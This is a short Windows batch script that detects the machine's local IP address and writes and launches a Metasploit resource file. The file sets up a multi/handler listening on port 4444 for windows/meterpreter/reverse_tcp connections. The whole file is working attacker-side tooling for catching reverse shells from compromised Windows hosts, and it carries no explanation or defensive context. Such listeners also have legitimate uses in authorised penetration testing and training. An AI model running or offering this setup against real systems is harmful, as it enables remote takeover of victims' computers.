@echo off
setlocal

set "LocalIP="
for /f "usebackq delims=" %%i in (`powershell -NoProfile -Command "Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -eq 'Up' } | ForEach-Object { $_.IPv4Address.IPAddress } | Select-Object -First 1"`) do set "LocalIP=%%i"

if exist "%~dp0msf.txt" (
    del /q %~dp0msf.txt >nul
)

echo use exploit/multi/handler >> %~dp0msf.txt
echo set payload windows/meterpreter/reverse_tcp >> %~dp0msf.txt
echo set LHOST %LocalIP% >> %~dp0msf.txt
echo set LPORT 4444 >> %~dp0msf.txt
echo exploit >> %~dp0msf.txt

start msfconsole -r %~dp0msf.txt

exit

endlocal